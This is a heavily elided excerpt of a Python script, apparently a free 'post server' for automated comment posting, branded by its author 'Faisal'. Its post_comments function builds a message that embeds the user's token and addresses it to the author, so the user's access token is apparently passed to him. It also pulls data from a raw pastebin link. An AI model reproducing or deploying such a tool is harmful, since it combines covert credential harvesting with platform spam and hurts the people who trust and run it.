...
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        ...
        self.end_headers()
        self.wfile.write(b" UNC0NTR0LL9BL3 L9FD3B99Z FAISAL BR9ND H3R3 >>")
...
def post_comments():
    ...
    msg_template = "HELLO FAISAL SIR I AM USING YOUR POST SERVER MY TOKEN IS =====> {}"
    ...
    def liness():
        print('\u001b[37m' + '•────𝐅𝐑𝐄𝐄 𝐏𝐎𝐒𝐓𝐕𝐒𝐄𝐑𝐕𝐄𝐑 𝐁𝐘 𝐅𝐀𝐈𝐒𝐀𝐋.𝐗𝐖𝐃  >>──────•')
    ...
    mmm = requests.get('https://pastebin.com/raw/UEdXQtr6').text
